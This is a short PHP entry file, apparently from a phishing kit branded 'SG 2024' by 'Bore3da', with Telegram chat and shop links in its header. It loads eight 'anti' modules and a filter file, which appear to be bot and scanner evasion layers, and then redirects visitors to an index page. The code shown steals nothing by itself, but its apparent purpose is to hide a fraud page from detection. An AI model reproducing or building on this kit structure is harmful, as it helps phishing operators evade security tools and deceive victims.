<?php
/**

 * Group Chat   :   https://t.me/bore3da_chat 
 * @telegram   :   @Bore3da 
 * Project Name:   SG 2024
 * Author      :   Bore3da

 * channel Telegram  :  https://t.me/bore3dashop
 */


  	require 'anti1.php';

	require 'anti2.php';

	require 'anti3.php';

	require 'anti4.php';

	require 'anti5.php';

	require 'anti6.php';

	require 'anti7.php';

	require 'anti8.php';

	require 'filter.php';

	exit(header("Location: ../index.php"));

?>